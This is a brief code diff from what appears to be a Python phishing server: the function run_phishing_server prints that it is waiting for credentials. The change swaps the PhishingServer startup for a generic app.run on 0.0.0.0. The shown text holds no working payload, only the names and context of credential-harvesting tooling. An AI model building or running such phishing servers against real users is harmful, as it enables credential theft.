@@ -271,6 +271,5 @@ def run_phishing_server():
     print("[+] Waiting for credentials...")
 
 if __name__ == "__main__":
-    phishing_server = PhishingServer()
-    run_phishing_server()
-#[START OUTPUT]
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
